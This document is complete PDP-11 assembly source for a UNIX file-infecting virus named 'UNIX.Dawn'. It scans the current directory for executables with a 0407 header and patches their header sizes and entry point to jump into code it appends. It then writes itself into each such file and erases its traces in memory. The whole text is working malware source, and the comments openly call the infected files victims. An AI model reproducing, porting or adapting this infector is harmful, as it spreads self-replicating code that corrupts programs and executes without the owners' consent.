/ UNIX.Dawn
	jmp	0f
0:
	mov	pc,r3		/ setup and restore victim
	cmp	-(r3),-(sp)	/ r3=start & word for MARK
	mov	r3,r4
	add	$8f-4,r4
	mov	(r4)+,(r1)+
	mov	(r4)+,(r1)+
	mov	$167,r5	
	mov	r4,1f
	mov	r4,2f
	mov	r4,4f	
	mov	r3,5f
	mov	r4,6f
	
	sys	open; 1:0; 0	/ open cur dir
	bes	done
	mov	r0,-(sp)
loop:	
	mov	(sp),r0		/ read dir
	sys	read; 2:0; 16.
	tst	r0
	ble	cdir
	mov	r4,r2		/ open victim
	tst	(r2)+
	mov	r2,3f
	sys	open; 3:0; 2
	bes	loop
	mov	r0,-(sp)
	sys	read; 4:0; 20.	/ read header
	bes	next

	cmp	$407,(r4)	/ is R/W .text executable?
	bne	next
	mov	(r2)+,r0	/ .text size
	add	(r2),r0		/ .data size
	sub	r1,r0
	add	$8f,(r2)+	/ adjust .data size
	add	$46.,(r2)+	/ adjust .bss size
	tst	(r2)+		/ size of symbol table==0?
	bne	next
	add	r1,r2		/ skip two empty fields...
	tst	(r2)+		/ relocation info stripped
	beq	next
	cmp	r5,(r2)		/ there is no jmp at start
	beq	next
	sub	r1,r4
	mov	(r2),(r4)+
	mov	r5,(r2)+
	mov	(r2),(r4)+
	mov	r0,(r2)+
	
	mov	(sp),r0		/ write body
	sys	seek; 0; 2
// no bcs, C is set on EBADF/ESPIPE [fio.c:24, sys2.c:135]
	mov	(sp),r0
	sys	write; 5:0; 9f-4
	bes	next
	mov	(sp),r0		/ write header
	sys	seek; 0; 0
	mov	(sp),r0
	sys	write; 6:0; 20.
next:
	mov	(sp)+,r0	/ close vic
	sys	close
	br	loop
cdir:
	mov	(sp)+,r0	/ close dir
	sys	close
done:
	mov	$006400,-(sp)	/   mark 0
	mov	$077502,-(sp)	/   sob r5,0b
	mov	$005023,-(sp)	/ 0:clr	(r3)+ 
	mov	sp,pc
8:
	clr	r0
	sys	exit
	.bss
9:	.=.+20.
